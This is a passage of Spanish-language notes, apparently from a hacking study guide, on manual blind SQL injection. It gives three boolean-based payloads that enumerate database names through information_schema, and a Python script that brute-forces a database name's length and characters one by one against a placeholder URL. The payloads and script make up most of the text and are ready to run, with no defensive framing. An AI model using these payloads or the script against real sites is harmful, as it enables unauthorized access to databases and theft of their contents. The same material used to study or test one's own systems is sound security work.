al acabar la sentencia que pongamos se finaliza con  `-- -`

todo lo que sigue es tratado como un comentario y no se ejecuta, lo que facilita que se ejecuten solo las modificaciones introducidas por el atacante.


# **Blind SQLI manual**



o   Se da cuando solo hay 2 opciones que te muestre información o que no

o   Hay q hacer consultas booleanas para saber si los resutados son correctos

o   1-identificar cuantas bbd tengo (COUNT)

o   2-ver cuantos caracteres tiene la bbd(LENGTH)

o   3-ir viendo cuales son los caracteres (por fuerza bruta) (SUBSTR)

o    

o   PAYLOADS

§  1'+and+ (select+COUNT (schema_name)+from+information_schema.schemata)={numero+con+el+que+se+prueba}+--+-

§  1'+and+(select+LENGTH (schema_name) +from+information_schema.schemata+limit+0,1)={numero+con+el+que+se+prueba}+--+-

§  1'+and+SUBSTRING((select+schema_name+from+information_schema.schemata+limit+0,1),{posición del caracter},1)='{caracter que se prueba}'+--+-


a continuacion un script para  sacar bbdd


```python
import requests
import string

def check_response(url, payload):
    """Enviar la solicitud y verificar si el contenido cambia de acuerdo al payload."""
    response = requests.get(url + payload)
    return "Texto específico encontrado" in response.text

def find_length(url, query_template):
    """Encuentra la longitud del nombre de la base de datos iterando sobre posibles longitudes."""
    for length in range(1, 20):  # Asumimos una longitud máxima de 20
        payload = query_template.format(length)
        if check_response(url, payload):
            print(f"La longitud del nombre de la base de datos es: {length}")
            return length
    return None

def find_name(url, length, query_template):
    """Encuentra el nombre de la base de datos iterando sobre cada posición de los caracteres."""
    result = ""
    for i in range(1, length + 1):
        for char in string.ascii_lowercase:  # Iterar sobre letras minúsculas
            payload = query_template.format(i, char)
            if check_response(url, payload):
                result += char
                print(f"Encontrado: {result}")
                break
    return result

# Configuración básica
base_url = "http://ejemplo.com/app.php?id=1"
true_condition = "-- -"  # Sufijo para comentarios SQL

# Longitud de nombre
length_query = "' AND (SELECT LENGTH(schema_name) FROM information_schema.schemata LIMIT 0,1)={}" + true_condition
name_length = find_length(base_url, length_query)

# Nombre de base de datos
if name_length:
    name_query = "' AND SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),{},1)='{}'" + true_condition
    database_name = find_name(base_url, name_length, name_query)
    print(f"El nombre de la base de datos es: {database_name}")
else:
    print("No se pudo determinar la longitud del nombre de la base de datos.")

```
